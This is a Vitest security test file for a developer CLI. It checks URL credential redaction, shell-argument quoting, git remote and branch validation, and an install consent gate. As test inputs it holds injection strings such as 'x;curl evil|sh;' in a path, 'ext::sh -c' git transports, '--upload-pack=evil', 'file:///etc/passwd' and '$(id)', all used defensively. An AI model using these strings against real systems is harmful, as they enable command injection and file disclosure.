import { describe, it, expect } from 'vitest';
import { redactUrlCreds, stripUrlCreds } from '../../src/core/util/redact.js';
import { shellArgQuote } from '../../src/core/detect/database.js';
import { assertSafeGitRemote, isSafeGitBranch } from '../../src/commands/pull.js';
import { parsePortConflict } from '../../src/core/providers/container/compose.js';
import { parseSessionFileName } from '../../src/core/providers/session/claudeNative.js';
import { ensureTool } from '../../src/core/util/tools.js';
import { Logger } from '../../src/core/util/logger.js';
import { AutoPrompter } from '../../src/core/util/prompt.js';
import { FakeRunner } from '../helpers/fakeRunner.js';

describe('credential redaction (trace / recorded remote)', () => {
  it('masks userinfo in a URL but keeps host/db', () => {
    expect(redactUrlCreds('psql postgres://app:s3cr3t@db.host:5432/app -tAc SELECT 1')).toBe(
      'psql postgres://app:***@db.host:5432/app -tAc SELECT 1',
    );
    expect(redactUrlCreds('https://x-access-token:ghp_abc@github.com/o/r.git')).toBe(
      'https://x-access-token:***@github.com/o/r.git',
    );
    expect(redactUrlCreds('no creds here postgres://db.host/app')).toContain('postgres://db.host/app');
  });

  it('strips creds entirely for a stored remote', () => {
    expect(stripUrlCreds('https://x-access-token:ghp_abc@github.com/o/r.git')).toBe('https://github.com/o/r.git');
    // scp-style SSH remotes have no userinfo to strip
    expect(stripUrlCreds('git@github.com:o/r.git')).toBe('git@github.com:o/r.git');
  });
});

describe('shellArgQuote (Alembic path)', () => {
  it('leaves benign paths untouched and quotes injection attempts', () => {
    expect(shellArgQuote('apps/api/alembic.ini')).toBe('apps/api/alembic.ini');
    // a malicious dir name cannot break out of the argument
    const q = shellArgQuote('x;curl evil|sh;/alembic.ini');
    expect(q.startsWith("'") && q.endsWith("'")).toBe(true);
    expect(q).not.toMatch(/;curl evil\|sh;(?!.*')/); // metachars are inside quotes
    // a `-`-leading path is quoted (can't be read as a flag)
    expect(shellArgQuote('--config=x').startsWith("'")).toBe(true);
  });
});

describe('git bootstrap validation', () => {
  it('rejects code-executing transports and flag-looking remotes', () => {
    expect(() => assertSafeGitRemote('ext::sh -c touch /tmp/pwned')).toThrow();
    expect(() => assertSafeGitRemote('file:///etc/passwd')).toThrow();
    expect(() => assertSafeGitRemote('--upload-pack=evil')).toThrow();
  });
  it('allows normal remotes', () => {
    expect(() => assertSafeGitRemote('git@github.com:o/r.git')).not.toThrow();
    expect(() => assertSafeGitRemote('https://github.com/o/r.git')).not.toThrow();
    expect(() => assertSafeGitRemote('ssh://git@host/o/r.git')).not.toThrow();
  });
  it('rejects flag-looking / weird branches', () => {
    expect(isSafeGitBranch('wave-1-identity')).toBe(true);
    expect(isSafeGitBranch('feature/x_y.z')).toBe(true);
    expect(isSafeGitBranch('--upload-pack=evil')).toBe(false);
    expect(isSafeGitBranch('a b')).toBe(false);
    expect(isSafeGitBranch('$(id)')).toBe(false);
  });
});

describe('parsePortConflict wordings', () => {
  it('matches dockerd and Docker Desktop phrasings', () => {
    expect(parsePortConflict('Bind for 0.0.0.0:5432 failed: port is already allocated')).toBe('5432');
    expect(parsePortConflict('Ports are not available: exposing port TCP 0.0.0.0:5432 -> 0.0.0.0:0: bind: address already in use')).toBe('5432');
    expect(parsePortConflict('nothing here')).toBeNull();
  });
});

describe('auto-install consent gate (no silent curl|sh in CI/non-TTY)', () => {
  const logger = () => new Logger({ level: 'error' });

  it('does NOT install non-interactively without --yes (AutoPrompter defaults=false)', async () => {
    const runner = new FakeRunner(); // uv not on PATH
    const res = await ensureTool('uv', runner, logger(), new AutoPrompter({ defaults: false }));
    expect(res.installed).toBe(false);
    // the install command (sh -c 'curl … | sh') must NOT have run
    expect(runner.calls.some((c) => c.command === 'sh')).toBe(false);
  });

  it('installs non-interactively only with --yes (AutoPrompter defaults=true)', async () => {
    const runner = new FakeRunner();
    runner.on('sh', () => {
      runner.available('uv'); // "install" puts it on PATH
      return {};
    });
    const res = await ensureTool('uv', runner, logger(), new AutoPrompter({ defaults: true }));
    expect(res.installed).toBe(true);
    expect(runner.calls.some((c) => c.command === 'sh')).toBe(true);
  });
});

describe('parseSessionFileName / scope robustness', () => {
  it('parses machine + timestamp (scope filtering is done by prefix elsewhere)', () => {
    // a hostname containing a scope keyword no longer breaks the pull filter,
    // which matches `claude-session-<ws>-<scope>-` as a literal prefix.
    const name = 'claude-session-app-project-global-runner-01-2026-07-08T10-14-27.tar.gz';
    const prefix = 'claude-session-app-project-';
    expect(name.startsWith(prefix)).toBe(true); // prefix filter selects it correctly
    expect(parseSessionFileName(name)?.timestamp).toBe('2026-07-08T10-14-27');
  });
});
